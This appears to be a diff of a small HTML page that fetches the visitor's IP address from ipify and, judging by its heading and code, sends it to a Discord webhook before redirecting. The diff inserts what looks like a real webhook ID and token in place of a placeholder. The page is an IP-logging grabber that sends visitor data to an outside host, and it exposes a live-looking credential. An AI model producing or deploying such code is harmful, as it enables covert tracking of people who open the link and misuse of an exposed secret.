@@ -9,7 +9,7 @@
     <h1>IPアドレスをDiscordに送信し、リダイレクトします...</h1>
     <script>
         // Discord WebhookのURL
-        const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+        const webhookUrl = 'https://discord.com/api/webhooks/1283032605213851688/w5-EXEGyPfpC70PfBUi_5TOrJGeZ2jcMJeZrCRtgxigpNXmiMQy1AX7V1inWtPDtCIDH';
         
         // IPアドレスを取得する外部API
         fetch('https://api.ipify.org?format=json')
